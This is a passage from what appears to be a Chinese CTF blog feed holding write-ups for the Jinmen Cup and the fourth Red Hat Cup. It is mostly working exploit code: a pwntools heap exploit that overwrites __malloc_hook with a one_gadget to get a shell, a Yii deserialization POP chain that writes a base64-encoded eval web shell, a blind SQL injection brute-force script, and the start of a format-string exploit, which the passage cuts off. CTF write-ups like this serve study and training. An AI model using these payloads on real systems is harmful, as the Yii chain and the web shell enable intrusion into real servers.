class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#encoding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&quot;debug&quot;</span></span><br><span class="line">context.terminal=[<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;sp&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cmd</span>(<span class="params">cmd</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&quot;&gt;&gt;&quot;</span>,<span class="built_in">str</span>(cmd))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">name,size,des,score</span>):</span></span><br><span class="line">    cmd(<span class="number">1</span>)</span><br><span class="line">    p.sendafter(<span class="string">&quot;name:&quot;</span>,name)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;size:&quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    p.sendafter(<span class="string">&quot;des:&quot;</span>,des)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;score:&quot;</span>,<span class="built_in">str</span>(score))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params"><span class="built_in">id</span></span>):</span></span><br><span class="line">    cmd(<span class="number">2</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;index:&quot;</span>,<span class="built_in">str</span>(<span class="built_in">id</span>))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params"><span class="built_in">id</span></span>):</span></span><br><span class="line">    cmd(<span class="number">3</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;index:&quot;</span>,<span class="built_in">str</span>(<span class="built_in">id</span>))</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;name:&quot;</span>,<span class="string">&quot;CTFM&quot;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;password:&quot;</span>,<span class="string">&quot;123456&quot;</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="string">&#x27;a&#x27;</span>,<span class="number">0xf8</span>,<span class="string">&#x27;b&#x27;</span>,-<span class="number">1</span>)<span class="comment">#0</span></span><br><span class="line">add(<span class="string">&#x27;a&#x27;</span>,<span class="number">0x68</span>,<span class="string">&#x27;b&#x27;</span>*<span class="number">0x68</span>,-<span class="number">1</span>)<span class="comment">#1</span></span><br><span class="line">add(<span class="string">&#x27;a&#x27;</span>,<span class="number">0xf8</span>,<span class="string">&#x27;b&#x27;</span>,-<span class="number">1</span>)<span class="comment">#2</span></span><br><span class="line">add(<span class="string">&#x27;a&#x27;</span>,<span class="number">0xf8</span>,<span class="string">&#x27;b&#x27;</span>,-<span class="number">1</span>)<span class="comment">#3 protect</span></span><br><span class="line"></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#清洗prev_size</span></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):</span><br><span class="line">    add(<span class="string">&#x27;a&#x27;</span>,<span class="number">0x68</span>,<span class="string">&#x27;b&#x27;</span>*(<span class="number">0x60</span>+(<span class="number">8</span>-i)),-<span class="number">1</span>)<span class="comment">#0</span></span><br><span class="line">    delete(<span class="number">0</span>)</span><br><span class="line"><span class="comment">#写入prev_size</span></span><br><span class="line">add(<span class="string">&#x27;a&#x27;</span>,<span class="number">0x68</span>,<span class="string">&#x27;b&#x27;</span>*<span class="number">0x60</span>+p32(<span class="number">0x170</span>),-<span class="number">1</span>)<span class="comment">#0</span></span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">add(<span class="string">&#x27;a&#x27;</span>,<span class="number">0xf8</span>,<span class="string">&#x27;b&#x27;</span>,-<span class="number">1</span>)<span class="comment">#1</span></span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">main_arean_xx  = u64(p.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">libc_base = main_arean_xx - (<span class="number">0x7f38b0163b78</span>-<span class="number">0x7f38afd9f000</span>)</span><br><span class="line">log.info(<span class="string">&quot;libc_base:&quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line">malloc_hook = libc_base+libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">log.info(<span class="string">&quot;malloc_hook:&quot;</span>+<span class="built_in">hex</span>(malloc_hook))</span><br><span class="line">system_addr = libc_base+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="string">&#x27;a&#x27;</span>,<span class="number">0x68</span>,<span class="string">&#x27;b&#x27;</span>*<span class="number">0x10</span>,-<span class="number">1</span>)<span class="comment">#2</span></span><br><span class="line">add(<span class="string">&#x27;a&#x27;</span>,<span class="number">0x68</span>,<span class="string">&#x27;b&#x27;</span>*<span class="number">0x10</span>,-<span class="number">1</span>)<span class="comment">#4</span></span><br><span class="line"></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">4</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">add(<span class="string">&#x27;a&#x27;</span>,<span class="number">0x68</span>,p64(malloc_hook-<span class="number">0x23</span>),-<span class="number">1</span>)<span class="comment">#0</span></span><br><span class="line">add(<span class="string">&#x27;a&#x27;</span>,<span class="number">0x68</span>,p64(malloc_hook-<span class="number">0x23</span>),-<span class="number">1</span>)<span class="comment">#2</span></span><br><span class="line">add(<span class="string">&#x27;a&#x27;</span>,<span class="number">0x68</span>,p64(malloc_hook-<span class="number">0x23</span>),-<span class="number">1</span>)<span class="comment">#4</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">0x45226 execve(&quot;/bin/sh&quot;, rsp+0x30, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  rax == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0x4527a execve(&quot;/bin/sh&quot;, rsp+0x30, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsp+0x30] == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0xf0364 execve(&quot;/bin/sh&quot;, rsp+0x50, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsp+0x50] == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0xf1207 execve(&quot;/bin/sh&quot;, rsp+0x70, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsp+0x70] == NULL</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">add(<span class="string">&#x27;a&#x27;</span>,<span class="number">0x68</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x13</span>+p64(libc_base+<span class="number">0x4527a</span>),-<span class="number">1</span>)<span class="comment">#5</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line">cmd(<span class="number">1</span>)</span><br><span class="line">p.sendafter(<span class="string">&quot;name:&quot;</span>,<span class="string">&quot;skye&quot;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;size:&quot;</span>,<span class="built_in">str</span>(<span class="number">123</span>))</span><br><span class="line">p.sendafter(<span class="string">&quot;des:&quot;</span>,<span class="string">&quot;dddd&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 津门杯 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>第四届红帽杯Writeup</title>
      <link href="archives/44c34994/"/>
      <url>archives/44c34994/</url>
      
        <content type="html"><![CDATA[<h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="find-it"><a href="#find-it" class="headerlink" title="find_it"></a>find_it</h2><p>.1ndexx.php.swp</p><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#Really easy...</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$file</span>=fopen(<span class="string">&quot;flag.php&quot;</span>,<span class="string">&quot;r&quot;</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;Unable 2 open!&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$I_know_you_wanna_but_i_will_not_give_you_hhh</span> = fread(<span class="variable">$file</span>,filesize(<span class="string">&quot;flag.php&quot;</span>));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$hack</span>=fopen(<span class="string">&quot;hack.php&quot;</span>,<span class="string">&quot;w&quot;</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;Unable 2 open&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&#x27;/system|eval|exec|base|compress|chr|ord|str|replace|pack|assert|preg|replace|create|function|call|\~|\^|\`|flag|cat|tac|more|tail|echo|require|include|proc|open|read|shell|file|put|get|contents|dir|link|dl|var|dump/&#x27;</span>,<span class="variable">$a</span>))&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&quot;you die&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(strlen(<span class="variable">$a</span>)&gt;<span class="number">33</span>)&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&quot;nonono.&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">fwrite(<span class="variable">$hack</span>,<span class="variable">$a</span>);</span><br><span class="line">fwrite(<span class="variable">$hack</span>,<span class="variable">$I_know_you_wanna_but_i_will_not_give_you_hhh</span>);</span><br><span class="line"></span><br><span class="line">fclose(<span class="variable">$file</span>);</span><br><span class="line">fclose(<span class="variable">$hack</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>直接phpinfo访问hack.php</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">index.php?code&#x3D;&lt;?php phpinfo();?&gt;</span><br></pre></td></tr></table></figure><p>搜flag</p><p><img src="https://cdn.redmango.top/img/20210509174714.png"></p><h2 id="framework"><a href="#framework" class="headerlink" title="framework"></a>framework</h2><p>yii框架，存在可用反序列化链，跟了一下没有变动，直接拿来打：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">yii</span>\<span class="title">rest</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">CreateAction</span>&#123;</span><br><span class="line">        <span class="title">public</span> $<span class="title">checkAccess</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$id</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;checkAccess = <span class="string">&#x27;assert&#x27;</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;id = <span class="string">&#x27;file_put_contents(&quot;3.php&quot;, base64_decode(&quot;PD9waHAgZXZhbCgkX1BPU1RbMV0pPz4=&quot;));&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Faker</span>&#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">yii</span>\<span class="title">rest</span>\<span class="title">CreateAction</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Generator</span></span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$formatters</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="comment">// 这里需要改为isRunning</span></span><br><span class="line">            <span class="keyword">$this</span>-&gt;formatters[<span class="string">&#x27;render&#x27;</span>] = [<span class="keyword">new</span> CreateAction(), <span class="string">&#x27;run&#x27;</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">phpDocumentor</span>\<span class="title">Reflection</span>\<span class="title">DocBlock</span>\<span class="title">Tags</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="title">use</span> <span class="title">Faker</span>\<span class="title">Generator</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">See</span></span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$description</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;description = <span class="keyword">new</span> <span class="built_in">Generator</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span>&#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">phpDocumentor</span>\<span class="title">Reflection</span>\<span class="title">DocBlock</span>\<span class="title">Tags</span>\<span class="title">See</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Swift_KeyCache_DiskKeyCache</span></span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$keys</span> = [];</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$path</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;path = <span class="keyword">new</span> See;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;keys = <span class="keyword">array</span>(</span><br><span class="line">                <span class="string">&quot;axin&quot;</span>=&gt;<span class="keyword">array</span>(<span class="string">&quot;is&quot;</span>=&gt;<span class="string">&quot;handsome&quot;</span>)</span><br><span class="line">            );</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 生成poc</span></span><br><span class="line">    <span class="keyword">echo</span> base64_encode(serialize(<span class="keyword">new</span> Swift_KeyCache_DiskKeyCache()));</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>发现php版本是5.6，可用assert，结合file_put_contents写个shell，可能编码原因写不进去，套个base64，拿到shell，里面有disable_func，蚁剑插件apache_mod直接绕，根目录下有个readflag。</p><h2 id="WebsiteManger"><a href="#WebsiteManger" class="headerlink" title="WebsiteManger"></a>WebsiteManger</h2><p>右键看一下有个/image.php/?id=，测了一下是数字型注入，过滤了空格，测了下库名为ctf，表如下：</p><p><img src="https://cdn.redmango.top/img/20210509180222.png"></p><p>Password字段</p><p><img src="https://cdn.redmango.top/img/20210509180258.png"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">req = requests.session()</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;url&quot;</span></span><br><span class="line">headers = &#123;</span><br><span class="line">  <span class="string">&#x27;User-Agent&#x27;</span>:<span class="string">&#x27;Mozilla/5.0 (Windows NT 6.2; rv:16.0) Gecko/20100101 Firefox/16.0&#x27;</span>,</span><br><span class="line">  <span class="string">&#x27;Accept&#x27;</span>:<span class="string">&#x27;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&#x27;</span>,</span><br><span class="line">  <span class="string">&#x27;Connection&#x27;</span>:<span class="string">&#x27;keep-alive&#x27;</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">chars = <span class="string">&#x27;-0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz&#123;&#125;_!@#$%^&amp;*()&#x27;</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;if(ascii(substr((select/**/group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_name=0x7573657273),&#123;0&#125;,1))=(&#123;1&#125;),1,0)&quot;</span></span><br><span class="line">payload = <span class="string">&quot;if(ascii(substr((select/**/group_concat(password)from(users)),&#123;0&#125;,1))=(&#123;1&#125;),1,0)&quot;</span></span><br><span class="line">result = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i in range(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">    <span class="keyword">for</span> j in chars:</span><br><span class="line">        data = payload.format(i,ord(j))</span><br><span class="line">        rep =  req.get(url+data,headers=headers)</span><br><span class="line">        text = rep.text</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;JFIF&quot;</span> in text:</span><br><span class="line">            result = result + j</span><br><span class="line">            <span class="keyword">print</span>(<span class="string">&quot;[+]&quot;</span>+result)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>注出来密码d2a0910f6615ed996116e</p><p>进后台直接file:///flag得到flag。</p><h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dd <span class="keyword">if</span>=EBCDIC.txt of=result.txt conv=ascii</span><br></pre></td></tr></table></figure><h2 id="colorful-code"><a href="#colorful-code" class="headerlink" title="colorful code"></a>colorful code</h2><p>题目给了两个文件分别是：data1、data2.</p><p>结合题目<code>colorful code</code>可以推断和像素点相关，data1都是数字，data2不知道是何种文件。</p><p>计算data2长度正好可以被3整除。怀疑每三个字节是一个RGB也就是每个字节是一个RGB。而RGB是十进制，只需要将读取到字节转换为16进制再转换为10进制。正好可以组成一个RGB数组。同时data1那就应该是这个RGB数组对应的数组下标。将data1通过空格进行分割为一个数组正好长度7067，那么这张图片的长度就是37*191。</p><p>那么现在思路就是通过每三个字节划分data2为一个RGB 数组，在通过空格将data1划分为一个下标数组，通过两个数组进行对应可以得出一个图片所需的RGB数组。然后将这些像素组填充到图像中，具体实现如下面的PHP脚本：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$color</span> =file_get_contents(<span class="string">&quot;data2&quot;</span>);</span><br><span class="line"><span class="variable">$point</span> = file_get_contents(<span class="string">&quot;data1&quot;</span>);</span><br><span class="line"><span class="variable">$point</span> = explode(<span class="string">&#x27; &#x27;</span>,<span class="variable">$point</span>);</span><br><span class="line"><span class="variable">$data</span> = str_split(<span class="variable">$color</span>,<span class="number">3</span>);</span><br><span class="line"><span class="variable">$height</span> = <span class="number">37</span>;</span><br><span class="line"><span class="variable">$weigth</span> = <span class="number">191</span>;</span><br><span class="line"><span class="variable">$flag</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="variable">$Rgb</span> = [];</span><br><span class="line"><span class="variable">$a</span>=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;count(<span class="variable">$point</span>);<span class="variable">$i</span>++)&#123;</span><br><span class="line"><span class="variable">$rgbTmp</span> = [];</span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$j</span> = <span class="number">0</span>;<span class="variable">$j</span>&lt;<span class="number">3</span>;<span class="variable">$j</span>++)&#123;</span><br><span class="line"><span class="variable">$tmp</span> = <span class="variable">$data</span>[<span class="variable">$point</span>[<span class="variable">$i</span>]];</span><br><span class="line">array_push(<span class="variable">$rgbTmp</span>,base_convert(bin2hex(<span class="variable">$tmp</span>[<span class="variable">$j</span>]),<span class="number">16</span>,<span class="number">10</span>));</span><br><span class="line">&#125;</span><br><span class="line">array_push(<span class="variable">$Rgb</span>,<span class="variable">$rgbTmp</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$image</span> = imagecreatetruecolor(<span class="variable">$height</span>, <span class="variable">$weigth</span>);<span class="comment">//图片大小</span></span><br><span class="line"><span class="variable">$a</span>=<span class="number">0</span>;</span><br><span class="line"><span class="variable">$black</span> = imagecolorallocate(<span class="variable">$image</span>,<span class="number">255</span>,<span class="number">255</span>,<span class="number">255</span>);<span class="comment">//设置颜色</span></span><br><span class="line"><span class="comment">//imagefill($image,0,0,$black) ;  //填充  // 从左上角开始填充灰色//背景</span></span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;<span class="variable">$height</span>;<span class="variable">$i</span>++)</span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$j</span>=<span class="number">0</span>;<span class="variable">$j</span>&lt;<span class="variable">$weigth</span>;<span class="variable">$j</span>++)&#123;</span><br><span class="line"><span class="variable">$tmp</span> = <span class="variable">$Rgb</span>[<span class="variable">$a</span>++];</span><br><span class="line"><span class="variable">$R</span> = imagecolorallocate(<span class="variable">$image</span>,<span class="variable">$tmp</span>[<span class="number">0</span>],<span class="variable">$tmp</span>[<span class="number">1</span>],<span class="variable">$tmp</span>[<span class="number">2</span>]);<span class="comment">//设置颜色</span></span><br><span class="line">ImageFilledRectangle(<span class="variable">$image</span>, <span class="variable">$i</span>,<span class="variable">$j</span>, <span class="variable">$i</span>,<span class="variable">$j</span>, <span class="variable">$R</span>);<span class="comment">//绘制图案</span></span><br><span class="line"><span class="keyword">echo</span> sprintf(<span class="string">&quot;(%s,%s,%s)\n&quot;</span>,<span class="variable">$tmp</span>[<span class="number">0</span>],<span class="variable">$tmp</span>[<span class="number">1</span>],<span class="variable">$tmp</span>[<span class="number">2</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//保存图片</span></span><br><span class="line">imagepng(<span class="variable">$image</span>, <span class="string">&quot;flag.png&quot;</span>); </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>脚本生成这面这个图片：</p><p><img src="https://goodcheerleung.gitee.io/macpic/ssss.png" alt="ssss"></p><p>老套路npiet Online解<a href="https://www.bertnase.de/npiet/npiet-execute.php">https://www.bertnase.de/npiet/npiet-execute.php</a></p><p><img src="https://goodcheerleung.gitee.io/macpic/image-20210509212501938.png" alt="image-20210509212501938"></p><h1 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h1><h2 id="parser"><a href="#parser" class="headerlink" title="parser"></a>parser</h2><p>绕过前面 http 的验证之后，有个格式化字符串：</p><p><img src="https://gitee.com/mrskye/Picbed/raw/master/img/20210509174612.png" alt="image-20210509174609336"></p><p>泄露 libc 和 stack 地址，格式化字符串修改 main 函数返回地址为 onegadget 正常退出函数就能 getshell </p><h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;sp&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"></span><br><span class="line">string=<span class="string">&#x27;&#x27;&#x27;POST / HTTP/1.1</span></span><br><span class="line"><span class="string">Host: 1</span></span><br><span class="line"><span class="string">User-Agent: M</span></span><br><span class="line"><span class="string">Accept: te</span></span><br><span class="line"><span class="string">Accept-Language: e</span></span><br><span class="line"><span class="string">Accept-Encoding: g</span></span><br><span class="line"><span class="string">Connection: close</span></span><br><span class="line"><span class="string">Upgrade-Insecure-Requests: 1</span></span><br><span class="line"><span class="string">Content-Type: 